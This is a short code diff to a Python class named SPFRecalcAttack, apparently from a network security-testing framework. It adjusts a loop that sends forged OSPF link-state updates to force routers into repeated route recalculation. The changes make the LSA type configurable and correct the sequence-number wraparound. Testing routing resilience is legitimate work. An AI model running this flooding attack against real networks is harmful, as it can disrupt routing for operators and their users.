@@ -23,7 +23,8 @@ class SPFRecalcAttack(BaseAttack):
         deadline = time.time() + self.config.duration
         while time.time() < deadline:
             lsa = build_lsa_with_body(
-                lsa_type=1, link_state_id=self.config.router_id,
+                lsa_type=getattr(self.config, 'lsa_type', 1) or 1,
+                link_state_id=self.config.router_id,
                 advertising_router=self.config.router_id, sequence=seq, age=0,
             )
             pkt = build_lsu_packet(
@@ -32,7 +33,7 @@ class SPFRecalcAttack(BaseAttack):
             )
             pkt = pkt / lsa
             self._sender.send_raw(pkt)
-            seq = (seq + 1) % 0x7FFFFFFF
+            seq = seq + 1 if seq < 0x7FFFFFFF else 0x80000001
             time.sleep(self.config.lsa_change_interval)
         return AttackResult(success=True, packets_sent=self._sender.sent_count,
                            target_affected=False,
